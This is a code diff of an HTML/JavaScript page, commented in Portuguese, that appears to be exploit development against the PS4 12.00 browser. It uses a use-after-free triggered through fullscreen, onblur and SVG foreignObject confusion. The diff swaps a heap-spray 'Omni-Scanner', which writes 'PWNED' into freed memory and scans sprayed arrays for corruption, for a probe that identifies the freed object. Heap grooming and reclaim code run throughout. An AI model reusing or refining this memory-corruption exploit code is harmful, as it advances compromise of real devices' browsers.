@@ -2,69 +2,21 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Omni-Scanner (Shotgun Spray)</title>
+<title>PS4 12.00 - Zombie Identity Probe</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Omni-Scanner → Massive Memory Hunt</h2>
+<h2>UAF → Zombie Identity Probe</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
-// ==========================
-// 🔒 SAFE LOG
 let logBuffer = [];
 function log(msg){
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
 }
 
-// ==========================
-// 🌍 OMNI-SPRAY (A REDE GIGANTE)
-function setupOmniSpray(){
-    log("[*] Iniciando Omni-Spray (7 Tipos de Memória)...");
-
-    window.sp_text = [];
-    window.sp_attr = [];
-    window.sp_jsarr = [];
-    window.sp_jsobj = [];
-    window.sp_u8 = [];
-    window.sp_ab = [];
-
-    for(let i=0; i<4000; i++){
-        // 1. DOM Text
-        let t = document.createTextNode("SAFE_TXT_" + i);
-        document.body.appendChild(t);
-        window.sp_text.push(t);
-
-        // 2. DOM Attribute
-        let d = document.createElement("div");
-        d.setAttribute("data-pwn", "SAFE_ATTR_" + i);
-        document.body.appendChild(d);
-        window.sp_attr.push(d);
-
-        // 3. JS Array Comum
-        window.sp_jsarr.push([0x1337, i, 0x1337]);
-
-        // 4. JS Objeto
-        window.sp_jsobj.push({ sig: 0x1337, id: i });
-
-        // 5. Uint8Array
-        let u8 = new Uint8Array(16);
-        u8[0] = 0x37; u8[1] = 0x13; // Assinatura em bytes
-        window.sp_u8.push(u8);
-
-        // 6. ArrayBuffer Bruto
-        let ab = new ArrayBuffer(32);
-        let view = new Uint32Array(ab);
-        view[0] = 0x13371337;
-        window.sp_ab.push(view);
-    }
-    log("[*] Omni-Spray concluído com sucesso!");
-}
-
-// ==========================
-// HEAP SETUP ORIGINAL (7. Float64Array - 100% INALTERADO)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
@@ -75,8 +27,6 @@ function setupHeap(){
     return arr;
 }
 
-// ==========================
-// FULLSCREEN (100% INALTERADO)
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
     fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
@@ -88,8 +38,6 @@ function setupFullscreen(){
     return fsTarget;
 }
 
-// ==========================
-// 💣 RECLAIM (100% INALTERADO)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
     for(let i=0;i<3000;i++){
@@ -104,8 +52,7 @@ function reclaim(size){
     }
 }
 
-// ==========================
-// 💥 SVG CONFUSION (100% INALTERADO - Minificado)
+// SVG MINIFICADO (O que revelou a verdade)
 function inject(child){
     try{
         child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
@@ -116,88 +63,33 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OMNI-SCANNER PROBE
+// 🔬 DIAGNÓSTICO DO ZUMBI
 function domOverlapProbe(fsTarget){
-    log("---- OMNI-SCAN PROBE ----");
+    log("---- ZOMBIE PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
-        if(!n) return;
-
-        if(n.nodeType === 3){
-            log("[!!!] TEXTNODE CONFUSION");
-
-            // 💣 A ESCRITA: Usamos uma string única "PWNED" (repetida 60x = ~300 bytes)
-            // Não muito grande para evitar criar um bloco novo, não muito pequena.
-            try{
-                n.data = "PWNED_".repeat(60); 
-                log("[PWN] Omni-Write disparado");
-            }catch(e){
-                log("[UAF] write crash");
-            }
-
-            // ==========================
-            // 🔥 A CAÇADA (Varrendo todos os arrays)
-            try{
-                log("[*] Escaneando milhares de objetos...");
-
-                // 1. Checa TextNodes
-                for(let i=0; i<window.sp_text.length; i++){
-                    if(window.sp_text[i].data && window.sp_text[i].data.includes("PWNED")){
-                        log("[$$$] JACKPOT! TextNode atingido @ " + i); return;
-                    }
-                }
-                // 2. Checa Atributos
-                for(let i=0; i<window.sp_attr.length; i++){
-                    let a = window.sp_attr[i].getAttribute("data-pwn");
-                    if(a && a.includes("PWNED")){
-                        log("[$$$] JACKPOT! Atributo DOM atingido @ " + i); return;
-                    }
-                }
-                // 3. Checa JS Arrays
-                for(let i=0; i<window.sp_jsarr.length; i++){
-                    if(window.sp_jsarr[i][0] !== 0x1337){
-                        log("[$$$] JACKPOT! JS Array atingido @ " + i); return;
-                    }
-                }
-                // 4. Checa JS Objetos
-                for(let i=0; i<window.sp_jsobj.length; i++){
-                    if(window.sp_jsobj[i].sig !== 0x1337){
-                        log("[$$$] JACKPOT! JS Objeto atingido @ " + i); return;
-                    }
-                }
-                // 5. Checa Float64Array (Pressão original)
-                for(let i=0; i<window.heap_press.length; i++){
-                    if(window.heap_press[i][0] !== i){
-                        log("[$$$] JACKPOT! Float64Array atingido @ " + i); return;
-                    }
-                }
-                // 6. Checa Uint8Array
-                for(let i=0; i<window.sp_u8.length; i++){
-                    if(window.sp_u8[i][0] !== 0x37){
-                        log("[$$$] JACKPOT! Uint8Array atingido @ " + i); return;
-                    }
-                }
-                // 7. Checa ArrayBuffer
-                for(let i=0; i<window.sp_ab.length; i++){
-                    if(window.sp_ab[i][0] !== 0x13371337){
-                        log("[$$$] JACKPOT! ArrayBuffer atingido @ " + i); return;
-                    }
-                }
-
-                log("[SCAN] Omni-Scan finalizado. Nada nesta passada.");
-
-            }catch(e){
-                log("[UAF] scan crash");
-            }
+        if(!n){
+            log("[!] Objeto sumiu!");
+            return;
         }
+
+        // Vamos descobrir a verdadeira identidade do nosso UAF
+        log("[OBJ] toString: " + Object.prototype.toString.call(n));
+        log("[OBJ] nodeType: " + n.nodeType);
+        log("[OBJ] nodeName: " + n.nodeName);
+
+        // Se ele for um elemento, vamos ver o que tem dentro
+        if(n.nodeType === 1){
+            log("[OBJ] innerHTML: " + n.innerHTML.substring(0, 30));
+        }
+
     }catch(e){
-        log("[UAF] probe crash");
+        log("[UAF] O zumbi crashou ao ser lido! (Isso é bom)");
     }
 }
 
 // ==========================
-// TRIGGER (100% INALTERADO)
 function trigger(fsTarget){
     log("[*] Trigger");
     try{
@@ -218,24 +110,14 @@ function trigger(fsTarget){
     }, 30);
 
     setTimeout(()=>domOverlapProbe(fsTarget), 80);
-    setTimeout(()=>domOverlapProbe(fsTarget), 180);
-    setTimeout(()=>domOverlapProbe(fsTarget), 280);
 
     setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
     setTimeout(()=>location.reload(), 600);
 }
 
-// ==========================
-// MAIN
 function runTest(){
-    log("[*] Iniciando teste Omni-Scanner...");
-    
-    // 1. Cria a nossa rede gigante primeiro
-    setupOmniSpray();
-
-    // 2. Mantém a pressão vital do Float64Array (inalterada)
+    log("[*] Iniciando Identificacao...");
     window.heap_press = setupHeap(); 
-
     let fsTarget=setupFullscreen();
     window.onblur=function(){
         log("[*] onblur");
